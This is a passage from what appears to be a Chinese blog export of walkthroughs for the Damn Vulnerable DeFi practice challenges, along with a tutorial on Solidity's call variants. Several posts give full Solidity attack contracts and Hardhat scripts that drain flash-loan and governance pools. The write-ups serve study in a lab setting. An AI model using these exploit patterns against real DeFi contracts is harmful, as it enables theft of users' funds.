&#125; else &#123; revert ActionFailed(actionId); &#125; &#125; return returndata; &#125; function getActionDelay() external pure returns (uint256) &#123; return ACTION_DELAY_IN_SECONDS; &#125; function getGovernanceToken() external view returns (address) &#123; return address(_governanceToken); &#125; function getAction(uint256 actionId) external view returns (GovernanceAction memory) &#123; return _actions[actionId]; &#125; function getActionCounter() external view returns (uint256) &#123; return _actionCounter; &#125; /** * @dev an action can only be executed if: // 只有在如下情况才可以能执行操作 * 1) it&#x27;s never been executed before and // 它以前从未被执行过 * 2) enough time has passed since it was first proposed // 自首次提出以来已经过去了足够的时间 */ function _canBeExecuted(uint256 actionId) private view returns (bool) &#123; GovernanceAction memory actionToExecute = _actions[actionId]; // 如果没排过队，就不能 进行 执行操作 ，直接退出 if (actionToExecute.proposedAt == 0) // early exit return false; uint64 timeDelta; // 时间三角洲？！ unchecked &#123; // timeDelta = 当前时间戳 - 排队时间戳 timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt; &#125; // actionToExecute.executedAt == 0(未被执行) 并且 timeDelta &gt;= 2 days return actionToExecute.executedAt == 0 &amp;&amp; timeDelta &gt;= ACTION_DELAY_IN_SECONDS; &#125;&#125; executeAction函数 (bool success, bytes memory returndata) = actionToExecute.target.call&#123;value: actionToExecute.value&#125;(actionToExecute.data)就是冒充的漏洞，SimpleGovernance调其他函数，就可以让它成为被盗函数的合约的 msg.sender就可以冒充。 要想成功执行executeAction函数，就得依次成功执行_hasEnoughVotes，queueAction，_canBeExecuted 所以重点就是 _hasEnoughVotes函数。 这个快照功能太复杂了，我知道 snapshots.ids.length始终 &#x3D; 1，我测试的结果是始终 &#x3D; 1 ，但是我不知道在哪设置的，index 除了第一次 是 0，之后一直都是 1。也就是说，里面存了一个索引为0的数据。看不懂 ….. _valueAt() 123456789101112 function _valueAt(uint256 snapshotId, Snapshots storage snapshots) private view returns (bool, uint256) &#123; require(snapshotId &gt; 0, &quot;ERC20Snapshot: id is 0&quot;); require(snapshotId &lt;= _getCurrentSnapshotId(), &quot;ERC20Snapshot: nonexistent id&quot;); uint256 index = snapshots.ids.findUpperBound(snapshotId); if (index == snapshots.ids.length) &#123; return (false, 0); &#125; else &#123; return (true, snapshots.values[index]); &#125;&#125; n天再看，，，，， 这里是继承。。。。。 ERC20中的铸币： 123456789101112function _mint(address account, uint256 amount) internal virtual &#123; require(account != address(0), &quot;ERC20: mint to the zero address&quot;); _beforeTokenTransfer(address(0), account, amount); _totalSupply += amount; _balances[account] += amount; emit Transfer(address(0), account, amount); _afterTokenTransfer(address(0), account, amount);&#125; 在三层继承中 ，DamnValuableTokenSnapshot &lt;= ERC20Snapshot &lt;= ERC20 在 DamnValuableTokenSnapshot 中，调用 mint ，_mint 中的 _beforeTokenTransfer 其实是先在 ERC20Snapshot 中找，如果找不到，再一层层往上找。所以使用 ERC20Snapshot 中的 _beforeTokenTransfer ，就会事先存入一个值，他的索引就是0. 3. solving3.1 SelfieHack.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./SimpleGovernance.sol&quot;;import &quot;./SelfiePool.sol&quot;;import &quot;hardhat/console.sol&quot;;/** 思路： 1. 部署 SimpleGovernance 合约，得到其地址 governance，构造器中的参数是js代码中的token.address 2. 部署 SelfiePool, 参数分别为 token.address 和 governance，得到合约 pool 3. 调用 SimpleGovernance 中 的`queueAction(address target, uint128 value, bytes calldata data)` 3.1 target = pool, value = 任意, data = abi.encodeWithSignature(&quot;emergencyExit(address)&quot;, player.address); 4. 调用 SimpleGovernance 中的 executeAction(uint256 actionId) external payable returns (bytes memory) 4.1 执行 queueAction 之后 actionId 会加一 ，所以要 进行-1 操作 */contract SelfieHack &#123; SimpleGovernance governance; SelfiePool pool; DamnValuableTokenSnapshot DVTSToken; constructor(address _governance, address _pool, address _token) &#123; governance = SimpleGovernance(_governance); pool = SelfiePool(_pool); DVTSToken = DamnValuableTokenSnapshot(_token); &#125; // 贷款，拿钱做自己想做的事情 function attack() external &#123; // 保存 `&quot;emergencyExit(address)&quot;, msg.sender`的 abi, 此时的 msg.sender = player.address bytes memory emergencyExitData = abi.encodeWithSignature(&quot;emergencyExit(address)&quot;, msg.sender); // 记录贷款数目（全贷） uint256 amount = DVTSToken.balanceOf(address(pool)); // 执行贷款操作 IERC3156FlashBorrower receiver = IERC3156FlashBorrower(address(this)); pool.flashLoan(receiver, address(DVTSToken), amount, emergencyExitData); &#125; function executeAction() external &#123; // 因为执行queueAction，SimpleGovernance 中的 行为次数会 加 1 ，所以要减 1 uint256 actionId = governance.getActionCounter() - 1; governance.executeAction(actionId); &#125; function onFlashLoan( address initiator, address token, uint256 amount, uint256 fee, bytes calldata data ) external returns (bytes32)&#123; // 得到钱之后马上拍照，记录当时我是有钱的 DVTSToken.snapshot(); // 执行 排队行为，为了接下来能够进行 执行行为 governance.queueAction(address(pool), 0, data); // 让 hacker 给 pool授权，不然 pool 不能执行 transferFrom函数，将hacker 的钱转回pool DVTSToken.approve(address(pool),DVTSToken.balanceOf(address(this))); // 按flashLoan要求返回 return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;); &#125;&#125; 3.2 selfie.challenge.js12345678it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const Hacker = await (await ethers.getContractFactory(&#x27;SelfieHack&#x27;, player)).deploy( governance.address, pool.address, token.address); await Hacker.attack(); await ethers.provider.send(&quot;evm_increaseTime&quot;, [2 * 24 * 60 * 60]); // 过两天 await Hacker.executeAction(); &#125;); 解题成功。","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"damn defi","slug":"Smart-contracts/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"The Rewarder","slug":"Smart contracts/damn defi/The Rewarder","date":"2023-07-11T00:37:10.000Z","updated":"2023-07-11T00:37:10.000Z","comments":true,"path":"2023/07/11/Smart contracts/damn defi/The Rewarder/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/11/Smart%20contracts/damn%20defi/The%20Rewarder/","excerpt":"","text":"1. issue There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it. Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards! You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself. By the way, rumours say a new pool has just launched. Isn’t it offering flash loans of DVT tokens? 简单来说，就是 我手中没钱，要求我去存钱并获取最多的利息。当然这理论上是天方夜谭，所以题目给我们提供了一个闪电贷。 题目链接 2. analysing2.1 FlashLoanerPoolflashLoan函数 123456789101112131415161718192021222324252627282930313233function flashLoan(uint256 amount) external nonReentrant &#123; uint256 balanceBefore = liquidityToken.balanceOf(address(this)); // 贷款的数目不能大于借贷池的 balanceBefore if (amount &gt; balanceBefore) &#123; revert NotEnoughTokenBalance(); &#125; // 调用者只能是合约 if (!msg.sender.isContract()) &#123; revert CallerIsNotContract(); &#125; // 向msg.sender转账 liquidityToken.transfer(msg.sender, amount); /** 解读 `functionCall(address target, bytes memory data)` 1. 这里涉及了库函数的使用，库函数的调用者即为 functionCall 的第一个参数 2. 此时的调用者必须是一个合约地址，且该地址的余额必须大于等于0 3. 函数中还会执行target.call&#123;value: value&#125;(data) 3.1. 使用 target 调用 data字节码表示的函数 3.2. 并且发送 value的金额，此时的value=0 sum: 在底层使用 target 调用 &quot;data函数&quot; */ // receiveFlashLoan 函数未定义，有操作空间 msg.sender.functionCall(abi.encodeWithSignature(&quot;receiveFlashLoan(uint256)&quot;, amount)); // 确保还钱之后，借贷池的余额大于未借贷之前的余额 if (liquidityToken.balanceOf(address(this)) &lt; balanceBefore) &#123; revert FlashLoanNotPaidBack(); &#125; &#125; 一个借贷功能，但是要求借贷人实现 receiveFlashLoan(uint256)函数才能借贷。 2.2 TheRewarderPool对目前的我来说，分析起来真要命（具体的细节还是那个快照）。。。。 先看构造函数，构造函数中的_recordSnapshot()就有大学问。 1234567891011121314151617181920constructor(address _token) &#123; // Assuming all tokens have 18 decimals liquidityToken = _token; // 金库地址 accountingToken = new AccountingToken(); // DVT token rewardToken = new RewardToken(); // 奖励代币 RWT /** 部署合约之后，拍一次快照， 此时的 lastSnapshotIdForRewards = 1，lastRecordedSnapshotTimestamp = 部署合约的时间 当我们的 msg.sender 第一次调用deposit时，lastRewardTimestamps[msg.sender] = 0 也就是，函数 _hasRetrievedReward 的判断条件 lastRewardTimestamps[account] &gt;= lastRecordedSnapshotTimestamp : 0 &gt;= uint64(block.timestamp) ？ lastRewardTimestamps[account] &lt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION ：0 &lt;= uint64(block.timestamp) + 5 days 所以只要是第一次进行操作的用户，结果返回的始终是false */ _recordSnapshot();&#125; 看完这个函数之后，给我的想法是，这不就是给新用户的福利吗，只要是新用户（msg.sender第一次调用此合约），不管怎么样，即使是我刚刚部署完合约就立马存钱就直接可以获得reward。 deposit函数 12345678910111213141516171819202122function deposit(uint256 amount) external &#123; // 存款不能为0 if (amount == 0) &#123; revert InvalidDepositAmount(); &#125; // 为 msg.sender 铸币 accountingToken.mint(msg.sender, amount); // 执行分配奖励机制 distributeRewards(); // liquidityToken 负责 从 msg.sender 向 address(this) 转移 amount 的ETH // 此时的 msg.sender 是 Account SafeTransferLib.safeTransferFrom( liquidityToken, msg.sender, address(this), amount ); &#125; 代码还行的，重点就是 distributeRewards(). distributeRewards()函数 123456789101112131415161718192021222324252627282930// 分配奖励函数function distributeRewards() public returns (uint256 rewards) &#123; // 是否是新的快照时期 if (isNewRewardsRound()) &#123; // 如果时新的回合，就更新当前快照 _recordSnapshot(); &#125; // 查询最新快照 的 totalSupply // 如果是第一回合，则返回铸币数目 uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards); // 在当前快照下，msg.sneder 的 balance uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards); if (amountDeposited &gt; 0 &amp;&amp; totalDeposits &gt; 0) &#123; // rewards = amountDeposited * REWARDS / totalDeposits rewards = amountDeposited.mulDiv(REWARDS, totalDeposits); // rewards &gt; 0; _hasRetrievedReward:是否检索到新的奖励 if (rewards &gt; 0 &amp;&amp; !_hasRetrievedReward(msg.sender)) &#123; // 为 msg.sender 铸奖励币 rewardToken.mint(msg.sender, rewards); // 记录 msg.sender 最新获利的时间 lastRewardTimestamps[msg.sender] = uint64(block.timestamp); &#125; &#125;&#125; 简单来说，就是账户没钱就不做什么操作，如果有钱，且rewards 和存钱时间大于 5days 就可以获得奖励池的RWT奖励，并更新该账户的获取时间。 _hasRetrievedReward函数 123456function _hasRetrievedReward(address account) private view returns (bool) &#123; return ( lastRewardTimestamps[account] &gt;= lastRecordedSnapshotTimestamp &amp;&amp; lastRewardTimestamps[account] &lt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION );&#125; 我有个疑惑，即使不是新用户，那么我只要将合约部署之后，过了五天之后，我就可以一直往里面获取奖励？ 因为 lastRecordedSnapshotTimestamp 只有在初始化的时候被赋值，只要我不赋值（即不再部署新的该合约，是不是就可以五天之后一直调用 奖励函数呢？ 想明白了： 看错代码了，lastRecordedSnapshotTimestamp 只在初始化中会执行一次，其他时候都在distributeRewards函数中，也就是说每次执行 奖励函数，如果成功获奖，那么久更新 lastRecordedSnapshotTimestamp。 到这里，做题思路就出来了，案例来说对于我们新用户，不用等 5days就可以取钱了的，所以只要向 借贷池中借 最多的钱，来执行我们的存钱操作就可以了。当然，题目还挖了个坑，，，， 1234expect( await rewarderPool.roundNumber()).to.be.eq(3); 要到第三回合才可以成功。要是有耐心的人的话，可以等 5天，但是我没耐心且在本地，就可以使用 ethers的工具，来篡改EVM的时间。 综上所述，我们的思路是： 部署 奖励池合约 等待 5 天，从 中获取 DVT 的闪贷FlashLoanerPool， 存入RewarderPool（执行deposit函数也会执行distributeRewards函数）， 提取 DVT 发送RewardToken给攻击者 偿还贷款。 3. solving3.1 RewardHack123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./FlashLoanerPool.sol&quot;;import &quot;./TheRewarderPool.sol&quot;;import &quot;../DamnValuableToken.sol&quot;;import &#123; RewardToken &#125; from &quot;./RewardToken.sol&quot;;import &quot;hardhat/console.sol&quot;;contract RewardHack &#123; DamnValuableToken damnValuableToken; FlashLoanerPool flashLoanpool; TheRewarderPool rewarderPool; RewardToken rewardToken; address player; constructor(address _dvtAddr, address _flashpoolAddr, address _rewarderpollAddr, address _rwtAddr) &#123; damnValuableToken = DamnValuableToken(_dvtAddr); flashLoanpool = FlashLoanerPool(_flashpoolAddr); // 用来调用 flashLoan rewarderPool = TheRewarderPool(_rewarderpollAddr); // 用来调用 存钱取钱 rewardToken = RewardToken(_rwtAddr); player = msg.sender; // 记录当前player的地址 &#125; // 让我们的 hacker 成为借贷着，虽然题目要求操作的是 player的余额，但是player 和 hacker 是自己人嘛 // receiveFlashLoan 还贷是在借贷之后的，所以可以假设我们现在有钱，我们先把自己要做的事情做完再还款 function receiveFlashLoan(uint256 amount) external &#123; /** 为了让 RewardHack 给 rewardPool授权 `allowance[msg.sender][spender] = amount;` safeTransferFrom 函数的声明有解释 The `from` account must have at least `amount` approved for */ damnValuableToken.approve(address(rewarderPool), amount); // 先执行存钱操作，里面执行了获利函数，此时 balance(RewardHack) = amount + rewards // 此时 amount 在 TheRewarderPool ，而 rewards 在 RewardHack 中 rewarderPool.deposit(amount); // 把存的钱（amount）取出来, amount 在 RewardHack 中 rewarderPool.withdraw(amount); // 要通过 TheRewarderPool账户 将 rewards 转给 RewardHack rewardToken.transfer(player, rewardToken.balanceOf(address(this))); // 还贷 damnValuableToken.transfer(address(flashLoanpool), amount); // 将 TheRewarderPool 中的rewards全部转给我（player） damnValuableToken.transfer(player, rewardToken.balanceOf(address(this))); &#125; function attack(uint256 amount) external &#123; /** 执行借贷操作： 对 RewardHack 函数来说，msg.sender 是我，对 FlashLoanerPool 来说msg.sender 是 RewardHack； 在执行 `liquidityToken.transfer(msg.sender, amount)`时， 金库 damnValuableToken 是给 RewardHack 转账 */ flashLoanpool.flashLoan(amount); &#125;&#125; 3.2 challenge.js12345678it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const attacker = await(await ethers.getContractFactory(&#x27;RewardHack&#x27;, player)).deploy( liquidityToken.address, flashLoanPool.address, rewarderPool.address, rewardToken.address ); await ethers.provider.send(&quot;evm_increaseTime&quot;, [5 * 24 * 60 * 60]); await attacker.attack(TOKENS_IN_LENDER_POOL);&#125;); 3.3 above all 这个challenge 的 msg.sender真的很绝，至少这是我目前遇到的最绕的一个。 理解好 msg.sender ，其实也还行。","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"damn defi","slug":"Smart-contracts/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Side Entrance","slug":"Smart contracts/damn defi/Side Entrance","date":"2023-07-10T09:37:10.000Z","updated":"2023-07-10T09:37:10.000Z","comments":true,"path":"2023/07/10/Smart contracts/damn defi/Side Entrance/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/10/Smart%20contracts/damn%20defi/Side%20Entrance/","excerpt":"","text":"1. issue A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time. It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system. Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool. 我们的目标就是，凭借手里的1 ether 将 pool的钱全部取出来。 题目链接 2. analysing观察合约可知，里面有三个函数，分别是 deposit(),withdraw(),falshLoan()。 我的第一反应是使用自毁函数，但是，分析才发现，自毁操作只会毁掉自己所在合约，不会对其他合约产生影响。 所以只能将目光看到，取款操作。 withdraw()： 12345678function withdraw() external &#123; uint256 amount = balances[msg.sender]; delete balances[msg.sender]; emit Withdraw(msg.sender, amount); SafeTransferLib.safeTransferETH(msg.sender, amount);&#125; 分析不难看出，我们只能取 mapping balance中所记录的金额大小。那我们看到存款操作。 deposit(): 123456function deposit() external payable &#123; unchecked &#123; balances[msg.sender] += msg.value; &#125; emit Deposit(msg.sender, msg.value);&#125; emmmmm，分析可知，只能存多少记录多少，看了看自己手中的 1 ether………还是继续往下看吧。 falshLoan() 12345678function flashLoan(uint256 amount) external &#123; uint256 balanceBefore = address(this).balance; IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;(); if (address(this).balance &lt; balanceBefore) revert RepayFailed();&#125; 嗯哼？看起来很简单，先给msg.sender转 amount数目的钱，再执行 execute函数。 又因为，execute函数定义在接口中，所以我们可以自定义该函数，由知道该操作是先给我们钱，再让我们去执行 execute，那就很简单了，我们可以那这 amount数目的钱拿去存，存在该合约中，到时候 一定会满足address(this).balance &lt; balanceBefore该条件，同时也可以在 msg.sender 的名义下存款，当然 msg.sender 就可以从 借贷池取款了，属于是空手套白狼了。 注意： 本题也没那么简单，想到了思路实现起来还是有点细节的。比如我们可以利用接口的知识，自定义一个接口，那么此时 IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;()中的 msg.sender一定得是，自定义 execute函数的合约地址（我的水平有限，不能马上理清层层调用的 msg.sender 是谁）。 我的理解是：外部账户（player）在实现了execte函数的合约（SideEntranceHack）中，通过pool调用pool中的 falshLoan函数，此时对于SideEntranceHack合约来说msg.sender是外部账户，对于操作pool来说，pool的msg.sender就是address(SideEntranceHack)。 所以，我们不管怎么弄，都不能以 player 为 msg.sender 来调用 withdraw 函数。 3. solving先写攻击合约 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./SideEntranceLenderPool.sol&quot;;contract SideEntranceHack &#123; SideEntranceLenderPool pool; address payable owner; constructor(address _addr) &#123; owner = payable(msg.sender); pool = SideEntranceLenderPool(_addr); &#125; function execute() external payable&#123; pool.deposit&#123;value: 1000 ether&#125;(); &#125; function attack(uint amount) public &#123; pool.flashLoan(amount); pool.withdraw(); &#125; receive () external payable &#123; owner.transfer(address(this).balance); &#125;&#125; 攻击思路，先利用 借贷池借给我的 1000 ethers，以 attacker 的名义存钱，再以 attacker 的名义取钱，最后将钱转发至 player的账户。 js题解 12345it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const attacter = await (await ethers.getContractFactory(&#x27;SideEntranceHack&#x27;, player)).deploy(pool.address); await attacter.attack(ETHER_IN_POOL); &#125;); 解题成功","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"damn defi","slug":"Smart-contracts/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"几个 call 的区别","slug":"Knowledge literacy/damn defi/几个 call 的区别","date":"2023-07-10T04:19:10.000Z","updated":"2023-07-10T04:19:10.000Z","comments":true,"path":"2023/07/10/Knowledge literacy/damn defi/几个 call 的区别/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/10/Knowledge%20literacy/damn%20defi/%E5%87%A0%E4%B8%AA%20call%20%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"","text":"call，delegatecall，staticcall的区别 1. delegatecalldelegatecall是一个很神奇的低级成员函数，和call很像，但是又很不同。 这里引用了 WTF 的图 1.1 delegatecall 和 call 的区别 delegatecall与call类似，是solidity中地址类型的低级成员函数。delegate中是委托&#x2F;代表的意思，那么delegatecall委托了什么？ 当用户A通过合约B来call合约C的时候，执行的是合约C的函数，上下文(Context，可以理解为包含变量和状态的环境)也是合约C的：msg.sender是B的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约C的变量上。 而当用户A通过合约B来delegatecall合约C的时候，执行的是合约C的函数，但是上下文仍是合约B的：msg.sender是A的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约B的变量上。 这样咋一看不太好理解，举个例子 一个投资者（用户A）把他的资产（B合约的状态变量）都交给一个风险投资代理（C合约）来打理。执行的是风险投资代理的函数，但是改变的是资产的状态。 简单来说就是，当 B 和 C合约拥有相同的状态变量，而 C 合约中有方法可以改变自身的状态变量，而如果通过 call的方式去调用 C的函数，那么改变的是 C合约本身的状态变量，但是如果通过，delegatecall来调用 C的函数，改变的是 B 合约的状态变量。 1.2 delegatacall 的语法delegatecall语法和call类似，也是： 1目标合约地址.delegatecall(二进制编码); 其中二进制编码利用结构化编码函数abi.encodeWithSignature获得： 1abi.encodeWithSignature(&quot;函数签名&quot;, 逗号分隔的具体参数) 函数签名为&quot;函数名（逗号分隔的参数类型)&quot;。例如abi.encodeWithSignature(&quot;f(uint256,address)&quot;, _x, _addr)。 和call不一样，delegatecall在调用合约时可以指定交易发送的gas，但不能指定发送的ETH数额 1.3 实例演示(区别call 和 delegatecall)调用结构：你（A）通过合约B调用目标合约C。 被调用的合约C 12345678910// 被调用的合约Ccontract C &#123; uint public num; address public sender; function setVars(uint _num) public payable &#123; num = _num; sender = msg.sender; &#125;&#125; 代理调用的合约B 1234567891011121314151617181920// 发起delegatecall的合约Bcontract B &#123; uint public num; address public sender; // 通过call来调用C的setVars()函数，将改变合约C里的状态变量 function callSetVars(address _addr, uint _num) external payable&#123; // call setVars() (bool success, bytes memory data) = _addr.call( abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num) ); &#125; // 通过delegatecall来调用C的setVars()函数，将改变合约B里的状态变量 function delegatecallSetVars(address _addr, uint _num) external payable&#123; // delegatecall setVars() (bool success, bytes memory data) = _addr.delegatecall( abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num) ); &#125;&#125; 部署B 、C合约 通过call的方式： 可以看到，B合约的状态变量没发生改变，C的状态变量发生了改变 通过delegatecall的方式： 可以看到，B合约的状态变量发生了改变，而C合约的状态变量未发生改变。 1.4 注意注意B和C的数据存储布局必须相同！变量类型、声明的前后顺序要相同，不然会搞砸合约。 2. staticcall Staticcall是一种类似于call的方法，但它不允许改变区块链的状态。这意味着，例如，如果被调用的函数更改了某些状态变量，我们就不能使用staticcall 。 简单来说，staticcall函数只能来进行一些读操作，不能进行写操作。","categories":[{"name":"Knowledge literacy","slug":"Knowledge-literacy","permalink":"https://biyouqiuqiu.com/categories/Knowledge-literacy/"},{"name":"damn defi","slug":"Knowledge-literacy/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Knowledge-literacy/damn-defi/"}],"tags":[{"name":"Knowledge literacy","slug":"Knowledge-literacy","permalink":"https://biyouqiuqiu.com/tags/Knowledge-literacy/"},{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"代理合约","slug":"代理合约","permalink":"https://biyouqiuqiu.com/tags/%E4%BB%A3%E7%90%86%E5%90%88%E7%BA%A6/"}]},{"title":"Truster","slug":"Smart contracts/damn defi/Truster","date":"2023-07-10T03:37:10.000Z","updated":"2023-07-10T03:37:10.000Z","comments":true,"path":"2023/07/10/Smart contracts/damn defi/Truster/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/10/Smart%20contracts/damn%20defi/Truster/","excerpt":"","text":"1. issue More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free. The pool holds 1 million DVT tokens. You have nothing. To pass this challenge, take all tokens out of the pool. If possible, in a single transaction. 目标：身无分文的你要将借贷池的钱全取出来。 题目链接 2. analysing2.1 寻找balance是什么 通过使用ethers.provider.getBalance()查询 pool.address的balance可以看到为 0， 但是通过token.balanceOf()可以查看到 balance为 1000000 ether。所以，题目所要借光的是 ERC20 token，要想对token的值动手，只能调用 ERC20 下的 转账操作，比如transfer(), transferFrom()。 2.2 TrusterLenderPool.sol分析flashLoan函数 1234567891011121314151617function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external nonReentrant returns (bool)&#123; // 记录当前借贷池的 balance uint256 balanceBefore = token.balanceOf(address(this)); // 他这里是从 token 中给 用户贷款，不涉及借贷池本身？ token.transfer(borrower, amount); // 细读 `functionCall` target.functionCall(data); if (token.balanceOf(address(this)) &lt; balanceBefore) revert RepayFailed(); return true; flashLoan写的很简单，需要注意的是，token.transfer(borrower, amount) 看到是token给borrower转账，这里要引起注意；target.functionCall(data);这行代码需要层层追踪才可以发现里面的新天地。 解读functionCall: 对data进行追踪，发现是functionCallWithValue在被使用的 123456789101112function functionCallWithValue( address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) &#123; require(address(this).balance &gt;= value, &quot;Address: insufficient balance for call&quot;); require(isContract(target), &quot;Address: call to non-contract&quot;); (bool success, bytes memory returndata) = target.call&#123;value: value&#125;(data); return verifyCallResult(success, returndata, errorMessage);&#125; (bool success, bytes memory returndata) = target.call&#123;value: value&#125;(data);中，有 data，这行代码其实是在调用函数，而函数就是被编译成为字节码的 data，所以 target就理所应当是包含 data函数的合约地址。 再进一步分析，我们的初衷是改变 balance，能改变balance的只有 转账操作，一种是 使用 transfer另一种中是transferFrom 如果使用transfer 12345678910111213function transfer(address to, uint256 amount) public virtual returns (bool) &#123; balanceOf[msg.sender] -= amount; // Cannot overflow because the sum of all user // balances can&#x27;t exceed the max uint256 value. unchecked &#123; balanceOf[to] += amount; &#125; emit Transfer(msg.sender, to, amount); return true;&#125; 要符合题意既要把pool的钱花光，还要给play.address地址转入一百万ether，使用 transfer能满足后者，但不能满足前一个条件 12let attackToken1 = token.connect(deployer); await attackToken1.transfer(player.address,TOKENS_IN_POOL)； 所以只能使用 transferFrom 如果使用 transferFrom 123456789101112131415161718192021function transferFrom( address from, address to, uint256 amount) public virtual returns (bool) &#123; uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals. if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount; balanceOf[from] -= amount; // Cannot overflow because the sum of all user // balances can&#x27;t exceed the max uint256 value. unchecked &#123; balanceOf[to] += amount; &#125; emit Transfer(from, to, amount); return true;&#125; 只要我们能够将transferFrom函数成功调用，就可以解决问题了。from的值为pool.address, to的值为player.address。能执行操作 1000000ether 就 必须让 pool.address 给 play.address approve 1000000ether的操作权限。 所以，data的值就是 transferFrom 的字节码。 approve函数 1234567function approve(address spender, uint256 amount) public virtual returns (bool) &#123; allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true;&#125; 由call的使用原理可知，msg.sender就是 pool的合约地址。 3. solving3.1 TrusterHack.sol12345678910111213141516// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./TrusterLenderPool.sol&quot;;import &quot;../DamnValuableToken.sol&quot;;contract TrusterHack &#123; function attack(address _pool, address _recevier, address _token) external &#123; // 通过pool地址，给玩家地址授权 bytes memory func_abi = abi.encodeWithSignature(&quot;approve(address,uint256)&quot;, _recevier, 1000000 ether); // 调用flashLoan TrusterLenderPool(_pool).flashLoan(0, _recevier, _token, func_abi); // DamnValuableToken(_token).transferFrom(_pool, _recevier, 1000000 ether); &#125;&#125; 注意：在合约中是不能调用transferFrom函数的，因为你不能将任意一个地址强转成ERC20类型，然后调用其中的方法（个人理解） 3.2 challenge.js1234567it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const attacker = await (await ethers.getContractFactory(&#x27;TrusterHack&#x27;, player)).deploy(); let attackToken = token.connect(player); await attacker.attack(pool.address, player.address, token.address); await attackToken.transferFrom(pool.address, player.address,TOKENS_IN_POOL);&#125;); 解题成功~ 还有另一种解题方式，通过etherjs 来解题的，原理都一样，实现的方法不同: 方法二","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"damn defi","slug":"Smart-contracts/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Naive receiver","slug":"Smart contracts/damn defi/Naive receiver","date":"2023-07-09T07:37:10.000Z","updated":"2023-07-09T07:37:10.000Z","comments":true,"path":"2023/07/09/Smart contracts/damn defi/Naive receiver/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/09/Smart%20contracts/damn%20defi/Naive%20receiver/","excerpt":"","text":"1. issue There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH. A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH. Take all ETH out of the user’s contract. If possible, in a single transaction. 简单来说，就是要将贷款人手中的钱变成 0。 题目链接 2. analysing2.1 FlashLoanReceiver.sol123456789101112131415161718192021222324252627282930function onFlashLoan( address, address token, uint256 amount, uint256 fee, bytes calldata ) external returns (bytes32) &#123; assembly &#123; // gas savings if 